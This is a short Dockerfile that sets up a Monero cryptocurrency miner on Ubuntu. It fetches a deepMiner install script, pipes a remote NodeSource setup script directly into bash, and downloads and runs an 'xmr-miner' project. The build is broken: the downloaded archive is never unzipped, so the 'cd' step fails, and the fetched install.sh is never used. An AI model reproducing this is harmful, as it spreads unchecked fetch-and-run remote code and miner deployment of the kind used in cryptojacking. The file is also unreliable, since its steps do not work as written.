FROM ubuntu

RUN             apt-get update -qq

RUN             apt-get install -qqy curl
RUN		curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
RUN		curl -sL https://deb.nodesource.com/setup_8.x | bash -
RUN		apt install -qqy nodejs
RUN		apt install -qqy unzip
RUN		wget https://codeload.github.com/bradoyler/xmr-miner/zip/master
RUN		cd xmr-miner-master && npm install
ENTRYPOINT npm run dev

